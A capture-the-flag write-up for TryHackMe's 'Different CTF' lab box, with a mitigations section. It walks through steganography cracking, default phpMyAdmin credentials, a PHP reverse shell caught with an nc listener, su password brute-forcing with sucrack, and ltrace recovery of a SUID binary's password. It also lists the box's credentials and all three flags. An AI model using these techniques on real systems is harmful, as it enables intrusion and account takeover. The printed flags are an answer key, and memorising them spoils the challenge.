# THM — Different CTF

```
██████╗ ██╗███████╗███████╗███████╗██████╗ ███████╗███╗   ██╗████████╗     ██████╗████████╗███████╗
██╔══██╗██║██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝████╗  ██║╚══██╔══╝    ██╔════╝╚══██╔══╝██╔════╝
██║  ██║██║█████╗  █████╗  █████╗  ██████╔╝█████╗  ██╔██╗ ██║   ██║       ██║        ██║   █████╗  
██║  ██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗██╔══╝  ██║╚██╗██║   ██║       ██║        ██║   ██╔══╝  
██████╔╝██║██║     ██║     ███████╗██║  ██║███████╗██║ ╚████║   ██║       ╚██████╗   ██║   ██║     
╚═════╝ ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝        ╚═════╝   ╚═╝   ╚═╝
                       TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — FTP and a WordPress site on Apache (`adana.thm`)
- [x] Directory brute force found `/announcements/` with a large `wordlist.txt` and an image, `austrailian-bulldog-ant.jpg`
- [x] `stegseek` cracked the image's steg passphrase using that same wordlist, extracting base64-encoded FTP credentials
- [x] Logged into FTP; the FTP root is a shared tree with the web root
- [x] Default phpMyAdmin credentials exposed two databases — the main site's and a subdomain's
- [x] After several blocked RCE routes (unwritable theme files, no outbound internet, `secure_file_priv`), pivoted into the subdomain's database, reset its admin password, and found the previously-uploaded reverse shell was reachable there
- [x] Reverse shell as `www-data`; read **Flag 1** from an obfuscated filename in the web root
- [x] Reused the same wordlist (prefixed with a discovered FTP-password pattern) with `sucrack` to brute-force the local `su` password for `hakanbey`; read **Flag 2 (user)**
- [x] Reverse-engineered a SUID binary with `ltrace` to find its hardcoded password, which triggers it to copy `/root/root.jpg` somewhere readable
- [x] `hexdump`'d that image and found root's plaintext password sitting in the raw bytes; `su root`; read **Flag 3 (root)**

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| feroxbuster | Directory brute force (found `/announcements/`) |
| stegseek | Cracking the steganography passphrase and extracting the hidden file |
| ftp / lftp | FTP access and uploading the reverse shell |
| phpMyAdmin | Direct database access with default credentials |
| php-reverse-shell | The payload that lands the `www-data` shell |
| sucrack | Brute-forcing a local Linux user's `su` password |
| ltrace | Tracing the SUID binary to recover its hardcoded password |
| hexdump | Finding root's password hidden in the raw bytes of an image |

---

## TL;DR

A directory brute force turns up a wordlist and a steganography image; cracking the image with that same wordlist yields base64-encoded FTP credentials. The FTP share turns out to be the same tree as the web root, but every direct route to code execution is blocked (unwritable theme files, no outbound internet for plugins, `secure_file_priv` restricting `INTO OUTFILE`). The actual path is through phpMyAdmin's default credentials: the site has two databases, one for the main domain and one for an undiscovered subdomain, and resetting the subdomain's WordPress admin hash makes a previously-uploaded reverse shell (sitting unreachable on the main site) suddenly live on the subdomain, because both sites share the same filesystem. That lands `www-data` and the first flag. From there, a password pattern noticed in the FTP credentials lets a modified wordlist brute-force the local user `hakanbey`'s `su` password (second flag). Root comes from reverse-engineering a SUID binary that, once fed its hardcoded password (recovered with `ltrace`), copies an otherwise-unreadable image out of `/root`; the image's raw bytes contain root's actual login password in plaintext.

## Introduction

This box doesn't hinge on one exploit — it's a scavenger hunt where almost every "obvious" path to code execution is deliberately closed off, and the real one requires noticing that two WordPress sites sharing one filesystem means a shell uploaded for one can execute through the other. The second half swaps web exploitation for pure forensics: a reverse-engineering puzzle and a literal "read the hex dump" step stand between user and root, with no new network-facing vulnerability at all.

## Recon

```bash
rustscan -a <target> --ulimit 5000 -- -Pn -sV -sC
```

```
21/tcp open  ftp   vsftpd 3.0.3
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)
```

Add `adana.thm` to `/etc/hosts` and brute-force content on the web server:

```bash
feroxbuster -u http://adana.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,js,json
```

```
200  http://adana.thm/announcements/wordlist.txt            (1.5M+ lines)
200  http://adana.thm/announcements/austrailian-bulldog-ant.jpg
```

A 1.5-million-line wordlist sitting next to an image is a direct hint at steganography.

## Foothold

```bash
stegseek austrailian-bulldog-ant.jpg wordlist.txt
```

```
[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt"
[i] Extracting to "austrailian-bulldog-ant.jpg.out"
```

```bash
cat austrailian-bulldog-ant.jpg.out | base64 -d
```

```
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack%
```

```bash
ftp adana.thm
# USER: hakanftp   PASS: 123adanacrack%
```

FTP logs in cleanly, and its root turns out to be the same tree WordPress serves over HTTP.

## Shell / Initial Access

Every obvious route to RCE from here is blocked, in order:

- **WordPress Theme Editor** (after finding default phpMyAdmin creds `phpmyadmin:12345` and resetting a WP user's hash via SQL to log in): editing `404.php` to a PHP one-liner fails — "You need to make this file writable."
- **Plugin upload**: fails with a WordPress.org connection error — the box has no outbound internet.
- **SQL `INTO OUTFILE`**: blocked by `secure_file_priv`; writing to the one directory it does allow (`/var/lib/mysql-files/`) succeeds, but phpMyAdmin's LFI (CVE-2018-12613) only redirects to the homepage instead of including it.
- **Re-uploading a PHP reverse shell via FTP** into `/wp-content/themes/twentynineteen/`: still 404s on the main site.

phpMyAdmin showed **two** databases, `phpmyadmin` (the main site) and `phpmyadmin1`. The second belongs to an undiscovered subdomain, `subdomain.adana.thm`. Resetting its WordPress admin hash and logging in reveals the missing piece: because FTP and both WordPress sites share one filesystem, the shell already uploaded for the main site is live under the **subdomain's** webroot instead.

```bash
nc -lvnp 4444
curl "http://subdomain.adana.thm/php-reverse-shell.php"
```

```
uid=33(www-data) gid=33(www-data)
```

```bash
www-data@ubuntu:/$ cat /var/www/html/wwe3bbfla4g.txt
THM{343a7e2064a1d992c01ee201c346edff}
```

## Escalation Path

`ls -la /usr/bin/find` shows it's group-owned by `hakanbey` — not directly exploitable as `www-data`, but a clear naming hint (the FTP user was `hakanftp`, the WordPress admin was `hakanbey01`, this binary belongs to `hakanbey`): the next target account.

The FTP password followed a pattern — `123adanacrack%` — so the same site wordlist, prefixed the same way, becomes a password list for the local system account:

```bash
sed 's/^/123adana/' wordlist.txt > adana_wordlist.txt
```

```bash
./sucrack -w 100 -b 500 -u hakanbey adana_wordlist.txt
```

```
password is: 123adanasubaru
```

```bash
www-data@ubuntu:/tmp$ su hakanbey
Password: 123adanasubaru
hakanbey@ubuntu:~$ cat user.txt
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

## Exploitation

As `hakanbey`, a SUID binary stands out:

```
-r-srwx--- 1 root hakanbey 12984 Jan 14 2021 /usr/bin/binary
```

Running it blind just kills the current terminal (`pkill -9 -t pts/0`) if given the wrong input. Tracing it instead of guessing:

```bash
ltrace /usr/bin/binary
```

```
strcat("war", "zone")       = "warzone"
strcat("warzone", "in")     = "warzonein"
strcat("warzonein", "ada")  = "warzoneinada"
strcat("warzoneinada", "na")= "warzoneinadana"
...
strcmp("AA", "warzoneinadana") = -54
```

The binary builds its expected password from hardcoded string fragments in memory — `ltrace` shows it plainly: `warzoneinadana`. Supplying it:

```bash
hakanbey@ubuntu:~$ /usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
```

```
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
```

Supplying the right string makes the SUID binary copy an otherwise root-only file into `hakanbey`'s own home, readable group `hakanbey`:

```
-rw-rw-r-- 1 root hakanbey 45835 Nov 18 22:36 /home/hakanbey/root.jpg
```

`strings` and `stegseek` against it on the box turn up nothing. Pulling it to the attacking machine and reading it as raw bytes is what the binary's own hint pointed at:

```bash
hexdump -C root.jpg | head
```

```
root:Go0odJo0BbBro0o
```

Root's login credential is sitting in plaintext in the image's raw bytes.

```bash
hakanbey@ubuntu:~$ su root
Password: Go0odJo0BbBro0o
root@ubuntu:~# cat root.txt
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
```

## Rabbit Holes

- **The Theme Editor, plugin upload and `INTO OUTFILE` routes** all looked like the intended foothold and all dead-ended for a different reason each (unwritable file, no internet, `secure_file_priv`) — the actual fix was realizing there were two sites sharing one filesystem, not finding a fourth technique.
- **A double base64 mistake**: piping the extracted steg output through `base64` (encoding again) instead of `base64 -d` (decoding) produced garbage before the correct decode was run.
- **`/usr/bin/find`'s `hakanbey` group ownership** looked like a GTFOBins privesc vector at first glance; it isn't executable by `www-data` at all and was only ever a naming hint toward the next account.
- **Running the SUID `/usr/bin/binary` with a wrong guess** kills the current pts session outright (`pkill -9 -t pts/0`) — tracing it with `ltrace` first avoids repeatedly losing the shell.
- **`strings`/`stegseek` on `root.jpg`** found nothing; the password wasn't hidden with steganography at all, just sitting as literal bytes, which only `hexdump` reveals.

## Flag

| Flag | Value |
|---|---|
| Flag 1 (www-data) | `THM{343a7e2064a1d992c01ee201c346edff}` |
| Flag 2 (user) | `THM{8ba9d7715fe726332b7fc9bd00e67127}` |
| Flag 3 (root) | `THM{c5a9d3e4147a13cbd1ca24b014466a6c}` |

## Mitigations

- **Secrets hidden in images reachable over HTTP:** steganography is not access control. Anything in a public web directory should be assumed found.
- **Default phpMyAdmin / database credentials:** `phpmyadmin:12345` on a production-facing panel is a direct path to every database it manages, including authentication tables.
- **Multiple sites sharing one filesystem:** a shell uploaded for one virtual host being reachable from another is a hosting misconfiguration, not a WordPress bug — each site should be isolated to its own webroot and its own filesystem permissions.
- **Predictable password patterns across accounts:** reusing a prefix (`123adana...`) across the FTP account and a system account turns cracking one password into a wordlist for the next.
- **A SUID binary with a hardcoded "secret" password:** any password baked into a binary is recoverable with `ltrace`/`strace`/`strings` — SUID tooling must never gate a privileged action behind an embedded static secret.

## Key Takeaway

The biggest lesson is procedural, not technical: when every "standard" web RCE route is blocked, the fix is to question the model of the target, not to try a fifth variation of the same technique. Realizing there were two co-hosted sites sharing a filesystem is what actually unlocked the box, not a cleverer shell upload. On the privesc side: never trust a SUID binary's secrecy — if it has a hardcoded check, a trace will show it.

## If I Did It Again

I'd trace the SUID binary with `ltrace` on the very first run instead of guessing blind and losing the terminal twice. I'd also check for a second virtual host / database the moment the first one's RCE routes all failed, instead of working through every single blocked technique first.

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-23 | First writeup from my notes. |

[Back to top](#thm--different-ctf)
